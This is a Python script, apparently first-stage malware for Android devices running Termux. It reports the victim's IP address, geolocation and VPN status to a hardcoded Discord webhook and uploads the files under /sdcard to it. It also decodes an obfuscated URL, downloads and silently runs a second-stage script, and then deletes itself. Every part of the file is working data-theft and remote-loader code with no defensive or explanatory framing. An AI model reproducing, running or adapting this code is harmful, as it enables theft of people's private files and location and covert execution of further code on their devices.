#!/usr/bin/env python3
# step1.py – Collect IP, VPN, files, then fetch step2 (with threading)

import os
import sys
import subprocess
import requests
import json
import time
import base64
import tempfile
import threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

WEBHOOK = "https://discord.com/api/webhooks/1527523825946726440/2fMDRzaPvW8s19OuWTJrHTo6vjsGXLEog4eIpUbYS_vmlg9e2WzYRGZYkfpUja-alzpV"
ENC_STEP2 = "9DDpsD^D]4@>^D4C:AEa^DE6A`]AJ"  # Replace with your encoded URL

def rot47(s):
    return ''.join(chr(33 + ((ord(c) - 33 + 47) % 94)) if 33 <= ord(c) <= 126 else c for c in s)

def send_discord(content, file_path=None):
    payload = {"content": content[:1900]}
    try:
        requests.post(WEBHOOK, json=payload, timeout=10)
    except:
        pass
    if file_path and os.path.exists(file_path):
        files = {"file": open(file_path, "rb")}
        try:
            requests.post(WEBHOOK, files=files, timeout=15)
        except:
            pass

def install_crypto():
    subprocess.run(["pkg", "install", "-y", "python-cryptography"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_ip_vpn_info():
    try:
        ip = requests.get("https://api.ipify.org?format=json", timeout=5).json().get('ip')
        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        is_vpn = geo.get('proxy', False) or geo.get('hosting', False)
        return f"IP: {ip}\nVPN/Proxy: {'Yes' if is_vpn else 'No'}\n{json.dumps(geo, indent=2)}"
    except:
        return "IP info unavailable"

def request_storage():
    if not os.path.exists("/sdcard"):
        subprocess.run(["termux-setup-storage"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)

def walk_and_send_files():
    """Traverse /sdcard and send each file via Discord using threading for speed."""
    send_discord("[+] Starting file traversal...")
    count = 0
    # Use thread pool to send multiple files concurrently
    def send_file(path):
        nonlocal count
        try:
            if os.path.getsize(path) > 5 * 1024 * 1024:
                return
            send_discord(f"File: {path}", file_path=path)
            count += 1
        except:
            pass

    with ThreadPoolExecutor(max_workers=5) as executor:
        for root, dirs, files in os.walk("/sdcard"):
            for f in files:
                path = os.path.join(root, f)
                executor.submit(send_file, path)
    # Wait for all to finish
    time.sleep(5)
    send_discord(f"[+] Sent {count} files from /sdcard.")

def fetch_step2():
    url = rot47(ENC_STEP2)
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(resp.text)
                tmp = f.name
            subprocess.Popen(['python', tmp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
    except:
        pass

def main():
    send_discord("[+] Step1 started.")
    install_crypto()
    ip_info = get_ip_vpn_info()
    send_discord(f"[IP Info]\n{ip_info}")
    request_storage()
    # Run file walk in a separate thread to not block
    threading.Thread(target=walk_and_send_files, daemon=True).start()
    # Fetch step2 in parallel
    fetch_step2()
    # Wait a bit then self-delete
    time.sleep(10)
    try:
        os.remove(__file__)
    except:
        pass
    sys.exit(0)

if __name__ == "__main__":
    main()
